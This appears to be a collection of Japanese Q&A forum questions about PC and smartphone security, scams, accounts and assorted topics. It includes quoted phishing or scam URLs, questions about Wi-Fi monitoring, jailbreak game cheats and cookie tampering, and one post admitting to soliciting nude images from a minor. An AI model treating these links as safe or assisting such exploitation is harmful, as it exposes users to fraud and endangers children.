余ってるXPをＸＰのままネットテレビの受信専用に使ったら安全上よくないですか？うちのルータは、子供のアイパッドやキンドルとアンドロイドタブと３ＤＳとPS４が 接続されていますが、どれもセキュリティソフトなど入れてないし、子供が適当に使っていますので、更新とかもしているかわからないし、セキュリティなどいいかげんです。 だからＸＰが安全じゃないと聞いていますが、現状と変わらない気がしています、けどなんか良くないでしょうか？
《回答至急！！これはウィルスメールですか？》 こんばんは。 友人から画像のようなメールが届いたので開けてしまったらこのサイトhttp://bit.mathieubourdeau.com/uevksgに行き少しだけ閲覧してしまいました。 でもすぐ怪しいと思い画面を閉じて、友人に聞いたらそんなメールは送っていないと言われすぐにしまった！と思ったのですが時すでに遅しですよね。 これってウィルスに感染したことになりますか？またこの目的ってなんですか？ 私はスマホからこのサイトを見ました。 受信したのはスマホのメールアドレスなのでメルアドをかえるのは面倒ですが個人情報が漏れるのを防げるならメルアドは変更しようと思います。 どなたか詳しい方、メルアドも変えるべきか回答お願いします。 またどうやって友人から私にメールを送れることになったのか、友人もメールアドレスを変更したほうが良いのか等も教えていただけると大変助かります。
にんにんくは一回いくつまではOKですか？ にんにんくだよ!
ID非公開質問をする必要もない内容なのに ID非公開で質問する人の気持ちがわかりません。と 耳に胼胝ができる程あっちこっちで見ます。そんな投稿をする人間にID非公開質問をしている人の気持ちが わかる訳がありません、必要と思われたからシステムが出来たのです。 この仕様が無かったらID非公開質問を貶している人の言う事が全て 筒抜けになるのです、それが人によってはどんなに危険な事か 分らない人には付ける薬がありません。 納得させるのも無理だと思います、否定論者は基本的に○○ですから。
数字の暗号の解読してください。m(__)mネットで色々調べて当てはめてみましたが、どれも違うようでお手上げです。 6861707079206269727468646179 宜しくお願い致します★m(__)m
kindleを買おうと考えていますが、セキュリティソフトを入れなければならないですか？
OAuth認証ってザルなのでしょうか？ OAuth認証を使ったWebサービスログイン（OpenIDログイン？）を利用しようとしたのですが、 知人に、OAuth認証はザルだからログインしたらID抜かれるリスクある と聞いたのですが・・・ 認証系、暗号系お詳しい方、ご意見うかがえますか そんなこといったらSSLだって…って思ってしまいます
自分は高校2年生ですネットで知り合った中学3年生の女の子に胸の画像などをしつこく頼み送ってもらったんですが これ通報されたら児童ポルノ法などで僕は捕まりますか？
たまにロボットじゃない確認の為とかの歪んだ意味の無い文字を読んで書いたり、写真の中から看板の写真を選んでください。 とかって何であるんですか？ ロボットってネット使うんですか？
このアプリって危険なアプリですよね。アンチウィルスなんて嘘ですよね。 これがもしスパイアプリなら、googleのやつから消されないのは、謎ですか？
Windows10 Home 32bit のデメリットを全て教えて下さい。 自分が知っている確かな情報は、 ①WindowsUpdateが自動的に起動し、更新される。※Home 32 bitでON、OFF可なのか？ ②自分が持っているファイルや画像、その他データーをマイクロソフト社に送信される。見られる？さらに打った文字、1文字、1文字も送信される。 上記２つの情報も合っていますか？ Windows10の色んな情報を教えて下さい。よろしくお願いします。
Yahoo!で検索中に、「このサイトは第三者によって改ざんされている可能性があります」と表示されているサイトに入ってしまいました。iPhoneからなのですが、何か問題が発生することはあるのでしょうか？ちなみに移動した先のサイトは「テレビ番組表の記録」です。回答お願い致します。
昨日家で、iPhoneのネットが急に繋がらなくなりました。が、iPhoneのWi-Fiをオフにすると繋がります。 Wi-Fi本体の故障ですかね？？
二段階認証プロセスを無効にする方法
ホワイトハッカーになりたいです。 高校一年です。 将来の夢を聞かれました。 パソコンでプログラミングなどをしているので、人の為になるよう、警視庁？警察庁？のホワイトハッカーになろうと考えています。 どっかのニュースで、ホワイトハッカーの高齢化と聞いて、自分が役に立てたらなと思い、考えました。 ちなみに、僕の偏差値は60ぐらいです。 ホワイトハッカーになるのだったら、どのぐらいの学力が必要ですか？ また、進学は、何学部に行けばいいですか？ 他にも、NECの顔認証にも興味があります。 NECに入るには、学力はいくつで、進学はどこに行けばいいでしょうか？
ニコニコ大百科(仮)は安全ですか？それからどれが本物のニコニコ大百科(仮)なのか分かりません…良かったら教えてください！
ワンズレンタカーを事前予約し借りたのですが予約前日にキャンセルすることになりました。ネットでキャンセル手続きをし確認メールは来たのですが、キャンセル料などのメールが来ません。これはキャンセル料は払わなくていいのでしょうか。
至急回答お願いします！！！！いつだったか忘れたんですけど ネットを利用してる際に違うリンクに飛んで いわゆるアダルトサイトにつながったんですけど そこで○○万振り込んでください。 といきなり出たので急いで消したんですけど、 当然、動画も会員登録もしていません。 なんですが今日急に番号も知らないはずなのに、 このようにきました。 ほっといても大丈夫なんでしょうか？
メルアドぽいぽいのアドレス復元方法 メルアドぽいぽいのメルアドとアカウントが、 登録後に何週間か経つと自然と消えていました。 削除されたようです。新たなアカウントを作り、設定メニューから開いても、 前のメルアドをメモしていなかったため、 問い合わせや復元が不可能です。 何か裏技的な方法で、前のメルアドを復元することはできないでしょうか？ よろしくお願い致します
機械音痴の者です。 パソコンに詳しい方、教えて下さい。 自分のパソコンが『ファイル共有ソフト』なのかどうかって どこで分かるのですか？. 裸の写真や個人情報が流れ出てしまった悲劇が昔あったそうです。 それに関する文章を見つけました。（どなたかのブログです） ＞運悪くファイル共有ソフトからウィルスが彼氏のパソコンに感染し パソコンの個人データがネットに流失してしまいます。 しかしまだ画像だけであったがさらに事態は悪化します。 個人情報も流失していてしまい彼氏の勤めていた会社の情報まで流失。 流失した個人名をmixiで検索したら2人とも本名で登録していたので身元が特定されます。 ＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿ そのような悲劇に陥りたくないので （変な写真は撮ってないけど個人情報を守りたいという意味で） 私のパソコンもそのソフトなのかどうか知りたいです。
会員サイトなどに登録しようとしたときに「私はロボットではありません」という不正登録を防ぐものがあったのですが何回か間違ってしまいここにのせた写真のような状況になってしまいました。このサイトを利用したいのですが時間が経てばまた登録できるようになるのでしょうか？
DSA認証とはどのようなものでしょうか。
スカイプについて。 P2P通信の代表格であるスカイプですが、NATがある場合にはNAT越えをする必要があります。実際には携帯電話のIPアドレスはプライベートアドレスであり、センターの方でNAPTによりアドレスの変換を行っているらしいですね。 それなのに、普通にスカイプ等が使えるのはなぜでしょうか。 普通NAPT(NAT)を使えば、内側のホストからのリクエストに対するレスポンスでない限り通さないわけですが。 ご存知の方、回答お願いします。
【至急】SSL証明書に関する質問をさせていただきます。 Webサイトを常時SSLにしたいと思い、少し前に証明書を発行しました。ですが、証明書を発行したのはいいですが、知識が無いのでその後がよく分かりません。 証明書や鍵、中間など何処かに置かなければならないなど有るなど詳しく教えていただければ幸いです。 SSLについて知識がある方至急宜しくお願い致します。
ITパスポー卜の問題でGPSの応用で使われているのは次のうちどれか？という問題が何回かでてきます。 答えは高速バスやスマートインターチェンジ等なのですが、調べても答えがわかりません。誰か教えてください。
offecのonenoteを使いてダウンロードしたテンプレートを使おうとしたら認証が必要です！となってどうやって認証するのでしょうか。使っているのは無料の2016です。
創価学会は、何故、聖教新聞を日経ヴエリタスのように電子化しないのでしょうか？ いつも聖教新聞が入ってたり、なかったりです 電子化でネット配信すれば、不着もないしコストも下がると思うのですが それにしても、前々からいい加減です
至急！！ウイルスですか！？Androidの自分の携帯でweblio英和和英というサイトで英単語を調べていました。すると、警告:危険なサイト(あんしんスキャンのやつ？)と出ました。なので安全サイトに戻るを押し、そうしたらまた警告:危険なサイト(さっきは赤だったのが黄色バージョンで。黄色が先だったかも？)となりまして、flaswBrowser_mobusi3442...というのが２つ勝手にダウンロードされました。一応、提供元不明のアプリだったのではじかれました。それと２、３回端末の初期化をしたんですが毎回多分最初に行ったサイトで同じようなことが起きています(ウイルスに感染しバッテリーが破損しましたっていう、アプリをダウンロードさせるやつとか)。 私の携帯はウイルスに感染しているんでしょうか？これはどのような状況なのか、それと今後どうすればよいか？おしえてください！！
軟式野球のボールをネットで買おうと思ったのですが 検定落ちボールが、検定球の半分くらいの値段だったのですが、何処が違うのか、普通に使えるのか教えてください。
質問があります。自分は、千恋万化をプレイしようと買って、PCにゲームをインストールしました。公式のホームページには、修正パッチがあることを知ったので、DLしたのですが、解凍ができないです。なぜか、PCに入れてあるソフト、ノートンセキュリティーに勝手に削除されてしまいます。危険なファイルと認識されてしまったのです。この修正パッチは安全なものでしょうか？また、ノートンをどうすればいいでしょうか？回答をまっています。
シャープ製AQUOSの文字フォント変更を したいのですがフォントを選択すると 変更されずに下のような画面に戻って きてしまいます...(泣) 何かいい方法ありませんか？ 私のスマホは安心アクセスという何かに フィルタリングされています。
質問失礼いたします。 グーグルのことで質問です。 ポケモンGOをするために母親がグーグル登録をしたのですが、パスワードを忘れてしまいました。 最後のパスワードの文字も覚えていないようです・・・。メモもしてないみたいです どうにかなりませんか？ よろしくお願いいたします。
ＷＥＢサイトなどのユーザー登録時にパスワードが設定できない。airbnbとyahoo usaでユーザー登録をしようとしたのですが、パスワードを設定すると「名前や電話番号に似たパスワードは設定できません」と出てきて、何度やり直しても登録ができません。何が原因でしょうか。 このカテゴリーが最適かどうかはわかりません。回答お願いします。
相手にGoogleアカウントとパスワードを、知られても大丈夫ですか？
長文になります 昔ＰＣ内にウイルスがいて 変な催促？みたいのをされていたのですが （うろ覚えなのですが、 インストールを完了させろみたいなを英語で書いてありました） その後xp→7にし そういった催促みたいなものは消えました 去年マザーボードや色んなものを 取り替えたのですが xp,7時代に使っていたHDDはいまだに使っています ここで質問なのですが そのウイルスはxp→7にした時点で消えたと考えてもよいのでしょうか？ それともなんらかのかたちで残っている可能性はあるでしょうか？ （セキュリティソフトはウイルスバスターをつかっていますが フルスキャンしても見つかりませんでした）
セキュリティソフトについて セキュリティソフト（カスペルスキー等）使っていて思ったのですが、定義ファイルを自動でアップデートされるじゃないですか？しかし無線LANとかだとたまに電波が悪くなって、自動で更新されない時があるんです その時には手動でアップデートするのですが、その際に定義ファイルが最新ではないと注意が出るのですが、その定義ファイルが最新のものでない状態の時はコンピュータは保護されている状態なのですか？
Windowsデフェンダーがあれば お金出してまでウィルスバスターは入りませんよね。 実際どうなんでしょうか 教えて下さい。
スマホで保存する画像のウィルスチェック方法はありますか？ スマホ単体でできるチェック方法を教えて下さい。 機械詳しくないです。 宜しくお願い致します。
カーナビの有料地図更新でデータのダウンロードには成功しましたが、取り込んだマップインストーラーが動こうとしません。「ウィンドウズの管理権限がおまえにはない、ログインしなおしてから起動せえ」とわけの分からないことを言っています。どうすれば起動するのでしょうか。ウィルスバスターズと関係があるのでしょうか？
アンドロイド セキュリティアプリはどれがいいですか？ 私なりに探してノートンさんに決めようかと思いましたが 権限にカメラの許可があるのがよくわからず、気になってやめました。 使いそうにないのはgps機能と外出先のWiFiの安全性を調べるものです。 後は社員さんに個人情報を楽しむ人がいない所が良いです。 よろしくお願いします。
スカイプをパソコン起動時に自動で立ち上がるように設定してあるのですが立ち上がりません。原因が分かる方いますか？パソコンのOSはウインドウズ１０です。セキュリティーはウイルスバスターが入っているのですがこちらをアップデートしてから立ち上がらなくなりました。これが原因なのでしょうか？
Youtubeのコメント欄などで使われる名前が 本名(ニックネーム) になってしまいます。どのようにしたら本名を隠してニックネームだけにできるのか教えてください。
スマホ紛失時ＬＩＮＥアカウントについて 現在、回線停止手続きをし、そのスマートフォンには電波が入らない状態にしています。しかし、そのスマートフォンにはwifiの電波を拾うことでネットにつなげる事が可能になります。 その時にＬＩＮＥアプリを起動した場合、持ち主である私のアカウントを使えるようになってしまいます。 その悪用を防ぐために、私の自宅ＰＣからログインをし、パスワードを変えようと思います。 ただ、ＰＣからＬＩＮＥにログインするには一度、スマホに認証コードを入力しないといけないのですが その過程を飛ばしてＰＣでログインし、パスワードだけでも変える。これは可能でしょうか？
出会い系サイトをやって見ようかと思っている20代女性ですが、若干怖くて踏み切れません。 悪徳サイトが大半だとも聞きますが、まともなサイトもちゃんとあると聞きました。であるならば、そういうサイトにぶつかれば全然問題無いのだと思います。 それか、いっその事、アメピグやfacebookを使って、良さげな娘にどんどんアタックした方が安全そうだから、そっちの方がいいんですかねぇ。。。 まぁ、ツイッターとかmixiでもいいんですけど。 ・・・・・色々考えると何だか判らなくなって来ました。 ネットで確実で安全に出会うにはどうすればいいんでしょうか？ アタックするにしても、メールの内容とかも工夫がいるんでしょうねぇ。。。 とりとめの無い質問になってしまいましたが安全な出会い系はどこですか？ それとも無難にmixiがいいですかFacebookがいいですか？
ノートPCのセキュリティソフトの更新についての相談ですノートパソコンを購入したときに付いていたMcAfee Livesafeというセキュリティソフトの契約期間が終了したみたいなので、セキュリティソフトについて考え直しているのですが、正直悩んでいます。 悩んでいる理由なのですが、McAfeeの契約期限が切れ、今までの機能は全く使えなくなるのかと思っていたのですが、ウイルススキャンなどの機能を試してみたら普通に使えたのです。たぶん試用版で使える機能、ということなのだと思うのですが…… セキュリティソフトに金をかける余裕はないので、無料でどうにかしようと思っているのですが、次の三つのうちならば、どうするのが一番良いでしょうか。 1.Avastなど、ほかのフリーでも使えるウイルス対策ソフトを導入する（当初これを考えていました） 2.McAfeeの使用を続ける（どの機能が使えるのか、これで事足りるのかはいまいちわかりません） 3.WindowsDefenderを使う 私は学生なので、パソコンの中にそこまで重要なデータは入っていないと思います。ただ、それなりにパソコンは使っているので、普通のコンピュータウイルスはできるだけ除去したいとも思っています。 セキュリティソフトを詳しく知っている方がいれば、教えていただけるとありがたいです。
これは問題がある脆弱性（？）なのか教えてください。ある会員ページで、パスワードを 「ABCDEFGHIJKLM（仮）」 に設定していたのですが、先日スマートフォンでアクセスを試みると、いくつか不可解な仕様が見受けられました。 ①パスワード入力のテキストボックスに入力すると、"●"などで表示されず、素のまま表示。 ブラウザの、候補表示・入力機能（？）も有効。 ②「ABCDEFGHIJKLM」に設定したはずが、字数制限なのか、勝手に「ABCDEFGHIJKL」と削られる。しかもログインできる。 主に質問は②に関してです（①も心配ですが）。 パスワード設定の際、事前に何文字以内で、などの案内はありませんでした。 ということは、ユーザーの意図しない形でパスワードが変更されているという事になります。 これが問題のある脆弱性なら、私はどんな検証をして、どんなアクションを取るべきでしょうか？
助けてくださいGoogleでウイルスの警告が出ました アプリをインストールしてしまいました あとＯＫボタンも押してしまいまた どうしたらいいですか
最近TSUKUMOでG_GEARのPCを買ったのですが(PC初心者)IEを開く度に左下に！のエラーが出てきます(今のところ私の行ったサイトすべてに発生しております) 例としてはマイクラ公式のダウンロード等の上の項目を押しても反応しない等です またFirefoxでは問題なかったのですが FirefoxでDLしたゲームを開こうとするとエラーが3程出てきて進行すらできていない状況です 誰かPCに詳しい方 お助け願います (ある程度のことはネットで調べましたがほぼダメでした)
遠隔操作「rescue by logmein」の危険性について教えてください。 米国のYahooメールがロックされて使えなくなったため 1-800-478-8053へ問い合わせたところrescue by logmeinという遠隔操作のソフトをダウンロードするよう指示され遠隔操作されました。途中で不安になり中断してもらいました。その後ウイルススキャンをしましたが、特に何も検出されませんでした。 この電話サポートはネットで調べたところYahooの正式なものではないみたいで不安です。 今回の遠隔操作中または今後このパソコンを使い続けることで私のパソコンからいろいろなアカウントのIDやパスワードが抜き取られた、または抜き取られるということはあるでしょうか。 どういった対策を講じればよいでしょうか。
「ネットリンチするな」「歪んだ正義感を持つな」とかいう意見をどう思いますか。 自分は反対です。 まずい店や接客の悪い店が、悪く書かれるのは当然。 それを、炎上とか言って被害者ぶる。「ネット社会の恐ろしさ」 「直接言えないで匿名で陰口しか叩けない奴ら」とか言って、、ネット使ってる人の悪口言う。 なんでもかんでも理不尽な凶悪クレーマーと、同一視。 恐ろしいのはネットじゃなくて、平気でまずいメシ出したり糞接客してくる、てめえらだろ。 本当に良い店か少なくとも普通の店だったら、一部のキチクレーマー以外、悪く書くわけねえだろっての。 悪いことをした芸能人が炎上するのも、当然。 人のうわさになるのが金になる、人のうわさになるから成り立つ、そういう職業でしょ。 それをネットリンチだのと、言いたい放題。 芸能人のほうがはるかに所得多くて、強いくせに。 弱者ぶって、被害者ぶる。 ウザいですね。 すぐ「炎上で傷ついた」とか言う。 ほんとはほとぼり冷めるの待ってるだけのくせに、ネットで民衆に傷つけられたことにして同情買おうとする。 全部、「陰湿なネットのゆがんだ正義感を持つ人々」のせい。 そんな風に他人に罪をなすりつけてる。 そもそもなんで自分が悪く言われてるのかは、棚上げ。 クソですね。 だいいちエゴサーチしなきゃネットで自分の評判とか分かるわけねえし、傷つくわけねえだろっての。 嘘ばっかつくなって感じですよ。 こういう時芸能人同士も、かばい合ってて、ネットをイジメだとか言って悪く言うからキモいし。 何がイジメだ馬鹿。って感じ。 明らかにお前ら芸ＮＯ人のほうが豪邸に住んでるし、強者だろが。 ちょっとお前らが実際にやった罪を民衆にウワサされたら、それでイジメか。 そういうわけで、食べ物ブログとか芸能人関係の掲示板とかを悪く言う連中にムカついてます。 みなさんどう思いますか。
最近友達に勧められた実況者のMSSPの方々についてなのですが､たくさんの実況動画をだされてるのはしってるのですがこれはおすすめ!!という実況動画があますか?それとMSSPさんの名前とか誰1人知らず顔と名前の見分けが全くつきません ネットで調べてもうまく出てこず；； よろしければ教えて欲しいです｡
スマホでインターネットを見ていたらスマホがウイルスに感染したからアプリをインストールして除去してください的なことが出てきたのでそのアプリのレビューを見てみたら評価が低いので逆に入れたら危ない気がするのですがどうしたらよいと思いますか？ 毎日毎日どんなサイトでも出てくるので迷惑なんです。
AVG AntiVirusがこのようなことになっているのですが、大丈夫でしょうか？このソフトを入れ始めた1月くらいの時はすべてチェックマークがついていたのですが、何週間前からビックリマークがつくようになりました。ウイルスチェックをしましたが、何も発見されませんでした。 これはフリー版だからなのでしょうか？ 修正使用としてもエラーしてしまいます。
ハッキングチャレンジサイト8946のtake7（http://www.hackerschool.jp/hack/take7.php） が解けません。「ファイルにインポートする」を押して、インポートしたファイルの「take7_login_status 0」 というところを「take7_login_status 1」にして、「ファイルからエクスポートする」を押して、編集したやつを選択するんですよね？ それでチャレンジサイトの「簡単ログイン！」を押したのですが、ログインできませんでした。 それで、F12開発者ツールの「ネットワーク」というところで「クッキー」を選んで 「応答cookie」のところを見たら、「take7_login_status 0」になっていました。 ブラウザは、「Internet Explorer 」の11です。 どうしたら変わるのでしょう？教えて下さい。お願いします。 お礼は500枚です。
Googleアカウントにログインできません。 サポートセンターに問い合わせて、確認コードを入力しても本人確認ができないと表示されてしまいます。対処の仕方を教えて頂きたいです。
社内システムのセキュリティ担当者です。とはいえ、スキルに乏しい担当者です。現在、上司より次世代FW（IPS/IDS）の導入を検討しろと指示があり、調査中です。パロアルト、フォーティゲイトなどのアプライアンス製品の導入を検討しています。 現在、社内NWには外部向けサーバーはなく（Web、Mailはホスティング）、今後も設置予定はありません。また旧来からのFW（SSG5)にて、ポート別の通信制御（http,https,pop3,smtp,ftpを適宜通す。外から中は無し）を行っております。 今回、特に標的型攻撃メール/リンク、ランサムウェア対策をまず実施したいと考えております。 １．次世代FWを導入した場合、標的型攻撃の各段階においての効果のあるところ。 （○○の機能によって、××を止めることができる etc） ２．インシデント発生時のトレースに使うために、次世代FWで通信ログを収集したいと思っているが、その取得・保存方法はどうやるのか？（機械内保存？外部保存？外部だったらWinOSなどで可能？） また、ログ取得の定石（プロキシ？！）などがあれば。 以上についてご見識のある方教えてください。
このNIKEとalphaのコラボジャケットどこのサイトで売ってるかわかりますか？ちなみにオークションアプリなどではなくネットで売っているものがいいです
セキュリティ脆弱性対策について伺いますウェブサイトとは無関係のプログラムです。 パケットは飛びません。 ファイルの入出力だけがあります。 こういうプログラムのセキュリティ脆弱性対策って、どう検査したらよいのでしょう？ パケットが、飛ぶプログラムだったら、AppScanで検査していましたが、パケットが飛ばないと検査のしようが思いつきません。 どう検査したらよいか、わかる方がいらっしゃいましたら教えて下さい。
GPSをオンにしたままチャットなどをしたら住所がバレたりするのでしょうか？ 尚、ダウンロードするときに[特別な権限は必要としません]と書いてあり、位置情報を使うなどはありませんでした。
aolメールでセキュリティだとかふざけたのばかり 出て、異常に腹が立って怒鳴り散らしているんですけど これ何とかならないんですか？しかもきちんと合っているのに不正なアクセス、だとか出て 余計腹立ちます。 セキュリティのあれを出なくさせる方法をとにかく教えてください！ 家族にも怒鳴っているから怖がられていて嫌です。
以下のサイトの問16（スケジューリングに関する問題）なのですが 教えて頂ければ幸いです。解説がありません。。。 よろしくお願いします。https://www.engineer.or.jp/c_topics/001/attached/attach_1635_6.pdf
ネットで アノニマスジャパン のホームページがありますが、あれは世界でも有名なアノニマスの日本版、なのですか？それとも名前を借りた偽物ですか？
このメッセージのURLは危険ですか？
最近頻繁に、通知されます。 「Windows DefenderとG Data インターネットセキュリティの両方が無効になっています。」 しかし、 コントロールパネル ＞システムとセキュリティー ＞セキュリティーとメンテナンス を開き、 セキュリティーを確認すると、全て「有効」と「OK」と表示されています。 勿論、G Data の表示も、問題ありません。 PCは、 今年２月、Windows 10に無償アップグレードしてから、特に問題はありません。 お手数をおかけして申し訳ありませんが、教えてください。 よろしくお願いいたします。
ケータイがウイルスに感染してしまいました。その後、下に出てるアプリをインストールしてそのままケータイを初期化してしてしまいました。これって大丈夫なのでしょうか？
【急募】位置情報についてです。私は今iPhone6を使っているのですが、設定→プライバシーのところにある、位置情報のオン/オフの設定を変えることができません。 位置情報はオンになっているのに、ポケモンGOなど、位置情報がいるアプリができません。 また、先日姉が新しくiPhone6にしたのですが、私と同じように位置情報の設定を変えられず、さらに最初から入っているマップの位置情報(現在地)も取得できないという状況です。 (私はiPhone6にした時点から使えていたのですが…。) 回答よろしくお願いします。
SO-03Fで、消してしまった画像データ(カメラで撮った)を復活させる方法はありませんか？
いち髪の裏エンディングの暗号が分かりません。誰か教えてください
ESETにファイルを解凍した後自動でスキャンする機能はありますか？
NICやワイヤレスカード、ドライバ、アダプタについて詳しく解説しているサイトを教えてくださいあるいはkali linuxにおいてairodump-ngでネットワークを探しても一つも見つからない理由を教えてください ただし、 ・電波が来ていることは確認済み（家のルータの隣でも見つからなかった） ・wlan1（使用するインターフェース）をwlan1mon（モニターモード）に変更済み ・ifconfig downとmaccchangerとifconfig upというのでは治らなかった ・airmon-ng check killで問題となりうる他のインターフェースを除去？済み です どうしましょう
ネットの掲示板の名無しさんて誰が呟いたのか分からないものですか？
shredコマンドは、記憶媒体のすべての領域にアクセスできますか？ここで質問したんですが、質問の仕方が下手だったようです。 パソコンを売ったり捨てたりする準備として、SSDをコマンドで完全に消去したいの... - Yahoo!知恵袋 http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q1416279250...
パソコンを売ったり捨てたりする準備として、SSDをコマンドで完全に消去したいのですが、どうしたから完全に消去できるのでしょうか？普段のOSはWindowsですが、SSDを消去するために、UbuntuをUSBから起動して、shredコマンドで10回ぐらい消去しました。 しかし、SSDのすべての領域にアクセスできていない気がしてなりません。 たとえば、128GBのSSDでも、マウントすると、実際に表示されて使える容量は、125GBぐらいのことはよくありますよね？ 残りの３GBにはshredコマンドでアクセスできていなく、この部分は消去できていないと考えてよいでしょうか？ 技術的なことも教えて頂けるとより助かります。
公衆Wi-FiでiPhoneでWindowsをテザリングするときのセキュリティについて喫茶店などの公衆Wi-Fiに、直接Windowsを接続するのは怖いので、一度、iPhoneでWI-Fiを拾ってから、それをUSBでテザリングしようと思っています。 ルーターでいうブリッジモードというものらしいですが、iPhoneでは優先でテザリングするときに限って、ブリッジモードが使えます。 公衆Wi-Fiで見るサイトは、Youtubeだけで、それ以外のサイトを見ることは絶対にありません。 このようにiPhoneを経由してて、公衆につなぐと、セキュリティ的にはどれぐらい高まりますか？なぜ高まるかも専門的に教えてください。 お願いします。
先日、LINEで ちなつだよ～(^○^)/ なんかアップデートしてから スマホの調子悪くなった～T-T ｹﾞｰﾑもLINEもﾍﾝになった>o<"新しいのに変えちゃいます (｡ゝд･) これ新しいIDです！ ↓↓↓↓↓↓ http://ksearch.dip.jp/ln_id/ 友達追加して連絡くださいね‼ 待ってます(^ｰﾟ)ﾉ というメッセージが来ました。Unknownからです。 実際、私にはちなつさんという友達がおり、LINEも持っています。しかし文面が明らかに本物ではありません。 このようなメッセージは2回目で、気味が悪いです。これ何ですか。
質問です！お礼は500コインでネットカフェのpcにitunesは入っていますか？ これからは入っている前提で質問します 1・ネットカフェのpcで ios9.3.4から9.3.3以下にダウングレードできますか？ もしできるのであればダウングレードの仕方を教えて下さい！URLおk ここから脱獄の質問になります！ 1・脱獄のアプリでオススメのアプリを教えてください！その理由も込みで ２・ホーム画面をカッコよくする脱獄アプリを教えて下さい！ 3・なんとかGuardianっていうアプリでゲームのチートができると聞いたのですが！ できますか？できるとして 白猫プロジェクト・モンスト・パズドラ のチートはできますか？できた上で どんなチートですか？ 教えてください！
Googleアカウントにログインできました。本当に困っています。 ポケモンGOをするために作ったアカウントにログインできなくなってしまいました。少し長いのですが、読んでいただけると嬉しいです。 ユーザー名はなんとか思い出したのですが、パスワードが思い出せません。 いつも使っているパスワードは3つあって、3つとも試してみたのですがどれも違います。 登録するときにパスワード再入力の欄があるので間違って登録したとは考えにくいです。 新しくパスワードを考えた覚えもないのですが… そこで、パスワードを再登録しようと思ったのですが、 メールアドレスを入力 →パスワードをお忘れの場合 →別の質問に答える →別の質問に答える(電話番号も違いました) →このGoogleアカウントを作成したのはいつごろですかという質問に答える(ポケモンGOを始めた月) →確認コードを受け取るメールアドレスを入力 →メールに6桁の番号が送られてくる →上の、6桁の正しい番号を入力 →本人確認できませんでした。現在このアカウントにログインできません。と出てくる 何回繰り返しても同じです。 色々調べてみたのですが、どうしてもログインできません。他にいい方法はないのでしょうか。 本当に困っています。どなたか助けていただけると嬉しいです。 丁寧に教えていただけるとありがたいです。 よろしくお願いします。
楽天モバイルへ提供している富士通のarrows rm02なのですがrootができますか？開発者設定でブートローダをonにして、もちろんバックアップは取ります。adb接続も忘れずに この後ブートローダはどう立ち上げるのですか？Nexusは電源をoffにした後に電源ボタンと音量を同時に押すと出てくるそうですが… ブートローダをアンロックしinstall-superboot-windows. batをネットから落としてクリックでいけませんかね。 どこ見ても日本製スマホはroot権限は出来ない。富士通ではrootは取れない と書かれていて。 読みずらい文章ですし所処は端折ってありますし間違っているところもあるとおもいますが回答をお願いします。
次のサイトの処理に関する問題を教えてください。 https://www.engineer.or.jp/c_topics/001/attached/attach_1616_6.pdf の問１3です。よろしくお願いいたします。
ネットが若者文化だったのはいつ(2000年代のどの辺)までだったのでしょうか？
パスワード一元管理アプリ1Passwordというアプリについて問い合わせしたいのですが、1Passwordの開発元は海外企業ですしサイトも英語で日本のサポートがありません。それで他に問い合わせするところがなくて困っています。どうしたらいいですか。
大学から渡されたパソコンでインストールしようとするとskysea client view とかって出てインストールできません！これを消す方法など教えてください
《スマホ乗っ取りについて》 本日、恥ずかしながらparty chatというチャットアプリにてトラブルを起こしてしまいました。 私は相手の方と普通にチャットで話していたのですが、急に 「あと1通だ」と相手に言われました。 私はなにがなんだかわからず、 「なにがですか？」と答えたところ、 「ありがとう、これで完了だ」「ネットは怖いんだよ」と相手が急に言い始めました。 そこでわたしは怖くなり、相手をブロックし、アプリも消しました。 これは新手のハッキングなのでしょうか？ アプリで相手と何度もチャットをかわすことでハッキングできるものがあって、私のスマホは乗っ取られてしまったのでしょうか？ 個人情報がたくさん入っているのでとても不安です。 チャットアプリをしていた自分が何よりも悪いのですが、対処法などご存じの方いらっしゃいましたら、教えてください。お願いします。
スマートフォンでのインターネット接続の安全性・匿名性スマートフォンでインターネット接続をしてメールを送る場合、キャリア回線を使う場合にしても、自分が所有のwifiルーターやWimaxを使う場合でも、店舗や公共空間のwifi電波を利用する場合でもいずれの場合でも、自宅のパソコンでインターネットをしてメール等を送るよりも住所や氏名などの個人情報は安全に守られる、つまりセキュリティレベルが高いと言えるでしょうか
僕はiPodtouchを使ってますそれで今日課金しようとしたけどAppleのセキュリティが出て無理でしたどうしたらいいですか？
フィッシングサイトについて フィッシングサイトって入力してた情報を収集してるだけですか？ ＩＤだったり、パスワードだったり 入力していない情報を勝手に盗まれることはあるのでしょうか？
以下のサイトの問33ですが 選択肢で①の暗号化アルゴリズムとは何か？わかりません。 また③についても2つの公開鍵が必要になる理由が以下の理由で良いか確認お願いします。 お互い、双方の公開鍵を渡しておき、送信する際に暗号化するということ？でしょうか。 よろしくお願いします。 https://www.engineer.or.jp/c_topics/001/attached/attach_1626_6.pdf
今日は何日ですか？
至急‼コイン50枚でお願いします。 きせかえスタイルという悪質サイトに登録してしまいました。どうやっても退会ができません。ネットで調べた方法でもできませんでした。マイメニューからもできませんでした。退会の仕方を是非教えてください。お願いします。できれば無料期間の2日以内でお願いします。
メールが6月以降受信できなくなりました。 ＯＵＴＬＯＯＫ2003、Windows8.1 設定は変えていません。 メールのサポートに電話をかけ、アカウントの入力などは問題ないことが確認できました。アカウントの設定のテストボタンを押しても「完了」となり問題ないことが確認できました。 送信はできています。 メールサーバーには6月以降のメールがたまっていることを確認しています。 メールサーバーにコピーを置いておく設定はしていません。 セキュリティソフトはマカフィで8月になってから期限切れを起こしましたが、ファイアーウォール、迷惑メールをチェックする設定を切っても受信できません。 ネットは問題なくできています。 原因、解決方法を教えてください。
同じパスワードを複数のウェブサイトで使いまわすのは危険ですか？
SDカードをPCに差し込んで、取り外した際。PC側にSDカードの情報、データの残骸が残ることはありますか？
マカフィーの月額版が買えません。 無料版を使っていましたが、期限が来たのでギフトカードを入れました。 しかし、Google Playの残高利用できませんと表示されます。 どうしたら買えますか？ 無料版は今日中までだそうですから、至急おねがいします。
7月中に Windows10 Pro 64bit にアップグレードを予定しています。ブラウザはＩＥ11になると思います。フリーのセキュリティソフトの1つとして、総合的であること、日本語対応であることから、COMODO Internet Security 2016 を進められています。ネットでも調べてみましたが、このソフトのセキュリティ面での長所、このソフトの弱点を補強するようなフリーソフト、がよくわかりません。 COMODOInternet Security 2016 を使用している方で、または検討中の方で、その組合せ使用例がありましたら、教えていただきたいのですが。
